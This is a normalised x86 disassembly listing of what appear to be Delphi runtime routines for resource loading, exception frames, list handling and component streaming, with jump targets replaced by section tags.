call sub_41c760
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41c4f8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41c760
pop ecx
sub_41c83c
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406cf8
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_41c88c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4027b4
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41c8d4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4027d4
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_41c904
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
leave
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x37 ] ch
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
xchg esp eax
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax - 0x36 ] bh
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
hlt
sub_41c9d8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403ff0
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403ff0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41ca30
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40408c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044fc
mov al 0x1
inc ebx
sub_41ca88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41caff
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4059cc
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_41738c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb06
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_416518
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4059cc
mov ecx eax
mov eax esi
pop edx
call sub_40d454
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4059cc
sub_41cb0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41cbb2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cbb9
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40408c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4200e0
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_408080
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41cbd4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a294
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a294
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a0dc
sub_41cc0c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a294
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a294
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_41a128
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a0dc
sub_41cc54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41cded
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_41a5a4
mov edi eax
xor edx edx
push ebp
push sub_41cdce
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cdd5
mov eax [ rw-data ]
call sub_41a608
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41cdaf
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41cd5d
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_41a238
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_419d84
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd64
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_416754
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41cbd4
pop ecx
mov edx esi
mov eax edi
call sub_41a128
mov eax ebx
call sub_40324c
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41cb0c
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41cc0c
pop ecx
inc esi
sub_41cd64
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
sub_41cdfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a5a4
mov edi eax
xor eax eax
push ebp
push sub_41ce97
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a608
retn
mov edx ebx
mov eax edi
call sub_41a238
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_41a128
mov eax esi
call sub_40324c
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_408080
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41cea8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a5a4
mov edi eax
xor eax eax
push ebp
push sub_41cf1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a608
retn
mov edx ebx
mov eax edi
call sub_41a238
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_41a128
mov eax esi
call sub_40324c
sub_41cf50
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
pop ecx
pop edx
pop ebx
retn
sub_41cf94
push ebx
push esi
push edi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c8d4
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_41cfd0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41eea8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41efb8
call sub_41cf44
sub_41cff4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_408080
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403f9c
sub_41d028
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_408080
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eea8
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41d0e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41d46c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41d46c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d0f0
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41efb8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41cf44
sub_41d118
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41d138
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404238
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4034d0
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41cf44
sub_41d1a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_41a5a4
mov esi eax
xor edx edx
push ebp
push sub_41d210
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d217
mov eax [ rw-data ]
call sub_41a608
retn
mov edx ebx
mov eax esi
call sub_41a238
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_40324c
mov edx ebx
mov eax esi
call sub_41a128
sub_41d21c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d32b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d332
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
xor edx edx
push ebp
push sub_41d30e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d360
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41ca30
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a238
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_404034
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41cb0c
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a238
call sub_41d1a0
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a238
mov edx eax
mov eax [ rw-data ]
call sub_41a51c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_41a32c
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41d33c
push ebx
mov ebx eax
mov eax ebx
call sub_41d430
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41be98
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41d360
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_40324c
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_41a238
call sub_40324c
inc edi
dec esi
jne r-xdata
sub_41d39c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_403194
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_4198cc
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4031d8
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_419944
mov edi eax
mov edx [ esp + 0x4 ]
call sub_419844
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4031b0
test al al
jne r-xdata
sub_41d46c
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41d4b8
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41d4b8
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
sub_41d508
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41d553
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41ed08
mov eax [ ebp - 0x4 ]
call sub_40425c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d55a
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
call sub_41cf44
sub_41d560
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41d600
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d104
test al al
jne r-xdata
mov eax ebx
call sub_41d104
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41aa58
jmp r-xdata
mov eax ebx
call sub_41d448
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41e070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d607
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_41aa38
mov esi eax
mov eax ebx
call sub_41e068
jmp r-xdata
mov eax ebx
call sub_41dfb8
mov eax ebx
call sub_41d104
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41e1d4
mov eax ebx
call sub_41e070
sub_41d630
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405044
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_41a0dc
inc esi
dec ebx
jne r-xdata
sub_41d66c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4201fc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405044
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405200
add esp 0x4
mov edx ebx
mov eax edi
call sub_4201d0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405044
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_4201d0
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41d6e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405044
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41d74c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41d76c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_402844
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41d74c
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41f19c
call sub_402844
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_40324c
sub_41d7cc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d8b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41f33c
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41d886
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41d8b7
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41d76c
pop ecx
test al al
jne r-xdata
call sub_403a54
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a00
sub_41d8dc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d954
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403448
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_419d84
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41d959
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41d76c
pop ecx
test al al
jne r-xdata
call sub_403a54
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a00
sub_41d97c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d9f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41f33c
mov ecx eax
